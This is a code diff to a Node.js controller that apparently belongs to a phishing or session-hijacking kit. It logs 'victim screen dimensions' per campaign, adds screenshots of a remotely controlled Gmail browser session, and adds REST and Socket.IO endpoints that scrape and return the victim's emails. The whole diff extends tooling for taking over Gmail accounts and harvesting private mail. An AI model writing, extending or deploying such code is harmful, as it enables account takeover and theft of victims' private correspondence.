@@ -19,7 +19,7 @@ class GmailBrowserController {
    */
   async createSession(req, res) {
     try {
-      const { sessionToken, campaignId } = req.body;
+      const { sessionToken, campaignId, screenWidth, screenHeight } = req.body;
       
       if (!sessionToken || !campaignId) {
         return res.status(400).json({
@@ -32,7 +32,11 @@ class GmailBrowserController {
         ip: req.ip,
         userAgent: req.get('User-Agent'),
         timestamp: new Date(),
+        screenWidth: parseInt(screenWidth) || 1920,
+        screenHeight: parseInt(screenHeight) || 1080,
       };
+
+      console.log(`📐 Creating session with victim screen dimensions: ${userInfo.screenWidth}x${userInfo.screenHeight}`);
 
       const sessionInfo = await this.gmailBrowserService.createGmailSession(
         sessionToken,
@@ -43,7 +47,7 @@ class GmailBrowserController {
       res.json({
         success: true,
         session: sessionInfo,
-        message: 'Gmail browser session created successfully'
+        message: 'Gmail browser session created successfully with custom screen dimensions'
       });
 
     } catch (error) {
@@ -154,8 +158,8 @@ class GmailBrowserController {
       const { sessionToken } = req.params;
       const screenshot = await this.gmailBrowserService.getScreenshot(sessionToken);
 
-      // Set headers for JPEG and performance optimization
-      res.setHeader('Content-Type', 'image/jpeg');
+      // Set headers for PNG and performance optimization
+      res.setHeader('Content-Type', 'image/png');
       res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
       res.setHeader('Pragma', 'no-cache');
       res.setHeader('Expires', '0');
@@ -334,6 +338,94 @@ class GmailBrowserController {
   }
 
   /**
+   * Get scraped emails for a session
+   */
+  async getScrapedEmails(req, res) {
+    try {
+      const { sessionToken } = req.params;
+      const emails = await this.gmailBrowserService.getScrapedEmails(sessionToken);
+
+      res.json({
+        success: true,
+        emails,
+        count: emails.length,
+        sessionToken
+      });
+
+    } catch (error) {
+      console.error('Error getting scraped emails:', error);
+      res.status(500).json({
+        success: false,
+        message: 'Failed to get scraped emails',
+        error: error.message
+      });
+    }
+  }
+
+  /**
+   * Manually trigger email scraping for a session
+   */
+  async scrapeEmails(req, res) {
+    try {
+      const { sessionToken } = req.params;
+      const page = this.gmailBrowserService.pages.get(sessionToken);
+      
+      if (!page) {
+        return res.status(404).json({
+          success: false,
+          message: 'Session not found'
+        });
+      }
+
+      const emails = await this.gmailBrowserService.autoScrapeGmailEmails(sessionToken, page);
+
+      res.json({
+        success: true,
+        emails,
+        count: emails.length,
+        message: `Successfully scraped ${emails.length} emails`
+      });
+
+    } catch (error) {
+      console.error('Error manually scraping emails:', error);
+      res.status(500).json({
+        success: false,
+        message: 'Failed to scrape emails',
+        error: error.message
+      });
+    }
+  }
+
+  /**
+   * Get high-quality screenshot
+   */
+  async getHighQualityScreenshot(req, res) {
+    try {
+      const { sessionToken } = req.params;
+      const screenshot = await this.gmailBrowserService.getScreenshot(sessionToken, {
+        type: 'png',
+        quality: 95,
+        optimizeForSpeed: false
+      });
+
+      // Set headers for PNG high quality
+      res.setHeader('Content-Type', 'image/png');
+      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+      res.setHeader('Pragma', 'no-cache');
+      res.setHeader('Expires', '0');
+      res.send(screenshot);
+
+    } catch (error) {
+      console.error('Error getting high-quality screenshot:', error);
+      res.status(500).json({
+        success: false,
+        message: 'Failed to get high-quality screenshot',
+        error: error.message
+      });
+    }
+  }
+
+  /**
    * Setup Socket.IO handlers for real-time browser control
    */
   setupSocketHandlers(io) {
@@ -412,6 +504,37 @@ class GmailBrowserController {
           
         } catch (error) {
           socket.emit('screenshotError', {
+            sessionToken,
+            error: error.message,
+          });
+        }
+      });
+
+      // Request email scraping
+      socket.on('requestEmailScraping', async (data) => {
+        const { sessionToken } = data;
+        
+        try {
+          const page = this.gmailBrowserService.pages.get(sessionToken);
+          if (!page) {
+            socket.emit('emailScrapingError', {
+              sessionToken,
+              error: 'Session not found'
+            });
+            return;
+          }
+
+          const emails = await this.gmailBrowserService.autoScrapeGmailEmails(sessionToken, page);
+          
+          socket.emit('emailsScraped', {
+            sessionToken,
+            emails,
+            count: emails.length,
+            timestamp: new Date(),
+          });
+          
+        } catch (error) {
+          socket.emit('emailScrapingError', {
             sessionToken,
             error: error.message,
           });
